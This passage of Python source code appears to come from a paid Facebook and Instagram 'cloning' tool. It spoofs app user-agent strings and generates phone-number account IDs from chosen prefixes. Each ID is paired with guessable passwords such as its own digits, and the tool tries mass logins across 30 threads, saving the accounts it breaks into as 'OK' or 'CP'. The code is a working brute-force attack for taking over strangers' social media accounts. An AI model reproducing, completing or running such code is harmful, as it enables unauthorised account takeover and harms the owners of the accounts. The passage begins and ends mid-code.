0370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
        igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182,253.0.0.23.114")
        igve=igv.split(",")
        andro=random.choice(["30/11","31/12","29/10"])
        versi=random.choice(igve)
        android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
        model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
        build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
        versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
        large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
        merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
        brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
        cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
        versi_app = str(random.randint(111111111,999999999))
        language = "en_GB"
        try:
            simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
        except:
            simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
        ua = [
        f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi}){basa}; {kode})",
        f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; {merk_device}; {brand_device}; {model_device}; {com}; {comi}){basa}; {kode})",
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{random.randrange(5,12)}.0.1; {dpi}720x1464; INFINIX MOBILITY LIMITED/Infinix; Infinix X682B; Infinix-X682B; mt6769; tr_TR; 269790803){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (27/{random.randrange(5,12)}.1.0; {dpi}dpi; 1080x2141; vivo; vivo 1907; 1907; mt6768; ru_RU; 388829083){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1.1; {dpi}dpi; 720x1280; samsung; SM-E500H; e53g; qcom; in_ID; 98288239){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1.1; {dpi}dpi; 720x1370; HMD Global/Nokia; Nokia 4.2; PAN_sprout; qcom; it_IT; 217948971){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (22/{random.randrange(5,12)}.1; {dpi}dpi; 1080x1794; HMD Global/Nokia; TA-1041; C1N; qcom; en_GB; 382290498){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 720x1440; HUAWEI; DUB-LX1; HWDUB-Q; qcom; en_US; 225283631){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1776; Sony; F5121; F5121; qcom; de_DE; 384108453){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1440x2712; Sony/docomo; SO-01L; SO-01L; qcom; in_ID; 383877306){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (26/{random.randrange(5,12)}.0.0; {dpi}dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; in_ID; 98288242){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; id_EN; 98288242){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x1920; LENOVO/Lenovo; Lenovo K33b36; K33b36; qcom; in_ID; 103516666){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (21/{random.randrange(5,12)}.0.1; {dpi}dpi; 1080x2201; vivo; vivo 1851; 1851; qcom; en_US; 382290498){basa}; {kode})',
        f'Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (24/{random.randrange(5,12)}.0; {dpi}dpi; 1080x2278; vivo; vivo 1939; 2004; qcom; en_US; 383877305){basa}; {kode})',
        f"Instagram {random.randrange(37,41)}.0.0.{random.randrange(10,99)}.{random.randrange(10,99)} Android (23/{str(random.randint(4,13))}; {dpi}dpi; {pxl}; Meizu; MX6; MX6; {com}; {comi}){basa}; {kode})"]
        return random.choice(ua)
    
def redmi_instagram_ua():
    rr = random.randint
    rc = random.choice
    android_versions = ["9", "10", "11", "12", "13"]
    device_models = ["Redmi 7", "Redmi 7A", "Redmi 8", "Redmi 8A", "Redmi 8A Dual", "Redmi 9", "Redmi 9A", "Redmi 9C", "Redmi 9 Prime", "Redmi 10", "Redmi 10 Prime", "Redmi 10X", "Redmi 10X Pro", "Redmi Note 7", "Redmi Note 7 Pro", "Redmi Note 8", "Redmi Note 8 Pro", "Redmi Note 8T", "Redmi Note 9", "Redmi Note 9 Pro", "Redmi Note 9S", "Redmi Note 9 Pro Max", "Redmi Note 10", "Redmi Note 10 Pro", "Redmi Note 10S", "Redmi Note 10 Pro Max", "Redmi Note 11", "Redmi Note 11 Pro", "Redmi Note 11S", "Redmi Note 11 Pro 5G", "Redmi Note 11T Pro", "Redmi Note 12", "Redmi Note 12 Pro", "Redmi Note 12 Pro+", "Redmi Note 12S", "Redmi Note 12 Pro Speed Edition", "Redmi K20", "Redmi K20 Pro", "Redmi K30", "Redmi K30 Pro", "Redmi K40", "Redmi K40 Pro", "Redmi K50", "Redmi K50 Pro", "Redmi K50G", "Redmi 9 Power", "Redmi 9 Activ", "Redmi Note 11E Pro", "Redmi Note 11 Pro+ 5G", "Redmi 12C"]
    build_versions = ["PKQ1.181021.001", "RP1A.200720.011", "QP1A.190711.020", "QQ1A.200105.002"]
    applewebkit_versions = ["537.36", "537.32", "537.21", "537.19"]
    chrome_versions = [f"{str(rr(70,120))}.{str(rr(0,9999))}.{str(rr(0,999))}.{str(rr(0,999))}" for i in range(100)]
    safari_versions = [f"{str(rr(534,538))}.{str(rr(0,99))}" for i in range(100)]
    instagram_versions = [f"{str(rr(100,250))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(10,99))}.{str(rr(100,999))}" for i in range(100)]
    dpis = ["320dpi", "480dpi", "420dpi", "360dpi"]
    screen_resolutions = ["720x1369", "1080x2244", "1080x1920", "720x1280"]
    device_manufacturers = ["Xiaomi/xiaomi", "samsung/samsung", "google/google", "oneplus/oneplus"]
    device_model_shorts = ["Redmi 7", "Galaxy S21", "Pixel 4", "OnePlus 8"]
    platforms = ["qcom", "mediatek", "exynos", "snapdragon"]
    languages = ["fr_FR", "en_US", "en_GB", "es_ES"]
    app_version_codes = ["209143957", "309143957", "409143957", "109143957"]
    user_agent = f"Mozilla/5.0 (Linux; Android {rc(android_versions)}; {rc(device_models)} Build/{rc(build_versions)}; wv) AppleWebKit/{rc(applewebkit_versions)} (KHTML, like Gecko) Version/4.0 {rc(chrome_versions)} Mobile Safari/{rc(safari_versions)} Instagram {rc(instagram_versions)} Android ({rc([28, 29, 30])}/{rc(android_versions)}; {rc(dpis)}; {rc(screen_resolutions)}; {rc(device_manufacturers)}; {rc(device_model_shorts)}; {rc(platforms)}; {rc(languages)}; {rc(app_version_codes)})"
    return user_agent
    
def generate_ua():
    rr = random.randint
    rc = random.choice
    android_version = str(rr(4,15))
    build_numbers = ["L747R", "K982E", "J654T", "H321R", "G982L", "F456K", "E219P", "D876N", "C543M", "B210H", "A987G", "N745F", "M382D", "L219C", "K654B", "J982A", "H753E", "G421K", "F198R", "E876L", "D543N", "C219M", "B982H", "A745G", "P382F", "O219E", "N654D", "M982C", "L753B", "J198R", "H876L", "G543K", "F219N", "E982M", "D745H", "C654G", "B382F", "A219E", "N982D"]
    chrome_version = f"{str(rr(80,120))}.0.{str(rr(1000,9999))}.{str(rr(1,200))}"
    safari_version = f"{str(rr(600,700))}.{str(rr(1,10))}"
    user_agent = random.choice([f"Mozilla/5.0 (Linux; Android {android_version}; iPhone 13 Pro Max){rc(build_numbers)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36", f"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/{safari_version} (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/{safari_version}"])
    return user_agent

def fbook_uaaa():
    rr = random.randint
    rc = random.choice
    ru = random.uniform
    android_versions = ["9", "10", "11", "12", "13"]
    device_models = ["Redmi 7", "Redmi 7A", "Redmi 8", "Redmi 8A", "Redmi 8A Dual", "Redmi 9", "Redmi 9A", "Redmi 9C", "Redmi 9 Prime", "Redmi 10", "Redmi 10 Prime", "Redmi 10X", "Redmi 10X Pro", "Redmi Note 7", "Redmi Note 7 Pro", "Redmi Note 8", "Redmi Note 8 Pro", "Redmi Note 8T", "Redmi Note 9", "Redmi Note 9 Pro", "Redmi Note 9S", "Redmi Note 9 Pro Max", "Redmi Note 10", "Redmi Note 10 Pro", "Redmi Note 10S", "Redmi Note 10 Pro Max", "Redmi Note 11", "Redmi Note 11 Pro", "Redmi Note 11S", "Redmi Note 11 Pro 5G", "Redmi Note 11T Pro", "Redmi Note 12", "Redmi Note 12 Pro", "Redmi Note 12 Pro+", "Redmi Note 12S", "Redmi Note 12 Pro Speed Edition", "Redmi K20", "Redmi K20 Pro", "Redmi K30", "Redmi K30 Pro", "Redmi K40", "Redmi K40 Pro", "Redmi K50", "Redmi K50 Pro", "Redmi K50G", "Redmi 9 Power", "Redmi 9 Activ", "Redmi Note 11E Pro", "Redmi Note 11 Pro+ 5G", "Redmi 12C"]
    build_versions = ["PKQ1.181021.001", "RP1A.200720.011", "QP1A.190711.020", "QQ1A.200105.002"]
    applewebkit_versions = ["537.36", "537.32", "537.21", "537.19"]
    chrome_versions = [f"{str(rr(70,120))}.{str(rr(0,9999))}.{str(rr(0,999))}.{str(rr(0,999))}" for i in range(100)]
    safari_versions = [f"{str(rr(534,538))}.{str(rr(0,99))}" for i in range(100)]
    density = ru(1.0,4.0)
    languages = ["en_US", "fr_FR", "es_ES", "ar_AR", "de_DE", "it_IT", "pt_PT", "zh_CN", "ja_JP", "ko_KR", "ru_RU", "tr_TR", "th_TH", "vi_VN", "id_ID", "ms_MY", "pl_PL", "nl_NL", "sv_SE", "da_DK", "no_NO", "fi_FI", "el_GR", "he_IL", "hi_IN", "bn_IN", "ta_IN", "te_IN", "ur_PK", "fa_IR"]
    carriers = ["WIFI", "ATT", "VZW", "TMB", "SPR", "EE", "O2", "Vodafone", "Orange", "Telenor", "Zong", "Ufone", "Mobilink", "Warid", "China Mobile", "China Unicom", "Vodafone IN", "Jio", "Airtel", "Idea", "MTNL", "BSNL", "Verizon", "AT&T Mobility", "T-Mobile US", "Sprint Corporation", "US Cellular", "Cricket Wireless", "MetroPCS", "Boost Mobile", "Straight Talk", "Rogers", "Fido", "Telus", "Bell Mobility", "SaskTel", "Koodo Mobile", "Virgin Mobile", "Freedom Mobile", "Telstra"]
    packages = ["com.facebook.katana", "com.facebook.orca", "com.instagram.android", "com.facebook.lite", "com.facebook.mlite", "com.facebook.adsmanager"]
    architectures = ["armeabi-v7a", "arm64-v8a", "x86", "x86_64"]
    facebooks = [f"[FB_IAB/{rc(['FB4A', 'FB5A', 'FB6A'])};FBAV/{str(rr(300,500))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(10,99))}.{str(rr(10,99))};]", f"[FBAN/{rc(['FB4A', 'FB5A', 'FB6A'])};FBAV/{str(rr(300,500))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(10,99))}.{str(rr(10,99))};FBBV/{str(rr(100000000,999999999))};FBDM/{{density={density:.1f},width={str(rr(720,1080))},height={str(rr(1280,2560))}}};FBLC/{rc(languages)};FBCR/{rc(carriers)};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/{rc(packages)};FBDV/{rc(device_models)};FBSV/{rc(android_versions)};FBOP/1;FBCA/{rc(architectures)};]"]
    user_agent = rc([f"Mozilla/5.0 (Linux; Android {rc(android_versions)}; {rc(device_models)}){rc(build_versions)}) AppleWebKit/{rc(applewebkit_versions)} (KHTML, like Gecko) Chrome/{rc(chrome_versions)} Mobile Safari/{rc(safari_versions)} {rc(facebooks)}", f"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/{rc(safari_versions)} (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/{rc(safari_versions)} {rc(facebooks)}"])
    return user_agent
    
def mbasic_ua():
    rr = random.randint
    rc = random.choice
    uazku1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(9,12))}; ru-ru; Redmi K20 Pro Premium Edition Build/QKQ1.{str(rr(111111,199999))}.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(71,99))}.0.{str(rr(3500,3900))}.{str(rr(140,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.5.2-go"
    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; SM-G950W Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(73,99))} Mobile Safari/537.36 Flipboard/4.3.0/{str(rr(5300,5500))},4.3.0.{str(rr(5300,5500))}"
    uazku3 = f"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/{str(rr(75,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36	Android"
    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; Infinix X683 Build/QP1A.{str(rr(111111,199999))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5300,5900))}.{str(rr(75,150))} Mobile Safari/537.36 GoogleApp/13.47.8.26.arm64"
    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(1,8))}.1.0; VSD243 Build/OPM8.{str(rr(111111,199999))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(60,75))}.0.{str(rr(3100,3500))}.{str(rr(75,99))} Safari/537.36"
    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,7))}.{str(rr(1,5))}; EK-GC200 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(60,99))}.0.{str(rr(3400,3900))}.{str(rr(100,150))} Mobile Safari/537.36"
    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku8 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,150))}.0.{str(rr(5500,5900))}.{str(rr(120,150))} Mobile Safari/537.36"
    uazku9 = f"Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36"
    uazku9 = f"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    uazku8 = str(rc([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7]))
    return uazku8

class main:
    def __init__(self):
        self.idzz = []
        self.loop = 0
        self.okss = []
        self.cpss = []
        self.nvss = []
        self.typee = []
        self.cppp = []
        self.linee = f"{C}═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━{X}"
        self.dot_string = lambda text:f"{R}[{G}{text}{R}]{X}"
        self.tool_logo = f"    {G}█████  ██       █████  ███   ██ ███████  \n   ██   ██ ██      ██   ██ ████  ██ ██       \n   ██      ██      ██   ██ ██ ██ ██ █████    \n   ██   ██ ██      ██   ██ ██  ████ ██       \n    █████  ███████  █████  ██   ███ ███████{X}\n{self.linee}\n{self.dot_string('•')} {G}AUTHOR   {Y}:  {G}DEV RAHUL AARAYA \n{self.dot_string('•')} {G}GITHUB   {Y}:  {G}https://github.com/devmp40\n{self.dot_string('•')} {G}STATUS   {Y}:  {G}PAID\n{self.dot_string('•')} {G}VERSION  {Y}:  {G}12.00\n{self.linee}"
    
    def refresh(self):
        os.system("clear")
        print(self.tool_logo)
    
    def divider(self):
        print(self.linee)
    
    def menu(self):
        self.refresh()
        print(f"{self.dot_string('1')} {G}Facebook Cloning [file] ")
        print(f"{self.dot_string('2')} {G}Instagram Cloning [04 digits] ")
        print(f"{self.dot_string('3')} {G}Facebook Cloning [04 digits] ")
        print(f"{self.dot_string('4')} {G}Facebook Cloning [10 digits] ")
        print(f"{self.dot_string('0')} {R}Exit Tools ")
        self.divider()
        select = input(f"{self.dot_string('?')} {G}Select {Y}: {G}")
        if select in ["1","01"]:file_clone()
        elif select in ["2","02"]:self.typee.append("insta");self.start_c()
        elif select in ["3","03"]:self.typee.append("fbook");self.start_c()
        elif select in ["4","04"]:self.typee.append("fb10");self.start_C10()
        elif select in ["0","00"]:sys.exit(print(self.linee+f"\n{self.dot_string('!')} {R}Thanks for using tools"))
        else:print(self.linee+f"\n{self.dot_string('!')} {R}Selected option is not valid");time.sleep(1);start()
    
    def start_c(self):
        self.refresh()
        print(f"{self.dot_string('•')} {G}Codes {Y}: {G}9210, 9020, 9830, 9800")
        print(f"{self.dot_string('•')} {G}Limit {Y}: {G}1000, 2000, 3000, 5000")
        self.divider()
        codee1 = input(f"{self.dot_string('+')} {G}Enter Code  {Y}: {G}")
        codee2 = input(f"{self.dot_string('+')} {G}Enter Code  {Y}: {G}")
        codee3 = input(f"{self.dot_string('+')} {G}Enter Code  {Y}: {G}")
        codee4 = input(f"{self.dot_string('+')} {G}Enter Code  {Y}: {G}")
        codee5 = input(f"{self.dot_string('+')} {G}Enter Code  {Y}: {G}")
        limit = int(input(f"{self.dot_string('+')} {G}Enter Limit {Y}: {G}"))
        print(self.linee+f"\n{self.dot_string('•')} {G}Generating Numbers...")
        for nbr in range(limit):
            seven_digits = "".join(random.choice(string.digits) for _ in range(6))
            self.idzz.append(seven_digits)
        self.refresh()
        print(f"{self.dot_string('1')} {G}Method {Y}[{G}api{Y}]")
        print(f"{self.dot_string('2')} {G}Method {Y}[{G}api{Y}]")
        self.divider()
        method = input(f"{self.dot_string('?')} {G}Select {Y}: {G}")
        with TPE(max_workers=30) as clone_sub:
            self.refresh()
            total_id = str(len(self.idzz))
            print(f"{self.dot_string('•')} {G}Total Accounts {Y}: {G}{total_id}")
           #print(f"{self.dot_string('•')} {G}Selected Code  {Y}: {G}{codee}")
            print(f"{self.dot_string('•')} {G}Process Has Been Started...")
            print(f"{self.dot_string('•')} {G}Use Auto Clicker For OK IDs")
            self.divider()
            for love in self.idzz:
                uid = random.choice([codee1,codee2,codee3,codee4,codee5])+love
                password = ["57273200", uid[:6], uid[:8], uid]
                if "insta" in self.typee:
                    if method == "1":clone_sub.submit(self.insta_M1, uid, password, total_id)
                    elif method == "2":clone_sub.submit(self.insta_M2, uid, password, total_id)
                    else:clone_sub.submit(self.insta_M1, uid, password, total_id)
                elif "fbook" in self.typee:
                    if method == "1":clone_sub.submit(self.fbook_M1, uid, password, total_id)
                    elif method == "2":clone_sub.submit(self.fbook_M2, uid, password, total_id)
                    else:clone_sub.submit(self.fbook_M1, uid, password, total_id)
                else:
                    pass
        print(self.linee)
        print(f"{self.dot_string('√')} {G}Process Completed ")
        print(f"{self.dot_string('•')} {G}Total OK {Y}: {G}{str(len(self.okss))}")
        print(f"{self.dot_string('•')} {G}Total CP {Y}: {G}{str(len(self.cpss))}")
        print(f"{self.dot_string('!')} {G}All Accounts Saved In /sdcard ")
        sys.exit(print(self.linee+f"\n{self.dot_string('!')} {G}Thanks for using tools"))
    
    def start_C10(self):
        self.refresh()
        print(f"{self.dot_string('•')} {G}Enter Full Number Like {Y}: {G}8434369140")
        print(f"{self.dot_string('•')} {G}Limit {Y}: {G}1000, 2000, 3000, 5000")
        self.divider()
        full_nmbr = input(f"{self.dot_string('+')} {G}Enter Nmbr  {Y}: {G}")
        limit = int(input(f"{self.dot_string('+')} {G}Enter Limit {Y}: {G}"))
        code = full_nmbr[:4]
        print(self.linee+f"\n{self.dot_string('•')} {G}Generating Numbers...")
        for nbr in range(limit):
            total = len(full_nmbr)
            digtt = str(total-4)
            gen_digtt = "".join(random.choice(string.digits) for _ in range(int(digtt)))
            self.idzz.append(gen_digtt)
        self.refresh()
        print(f"{self.dot_string('1')} {G}Method {Y}[{G}api{Y}]")
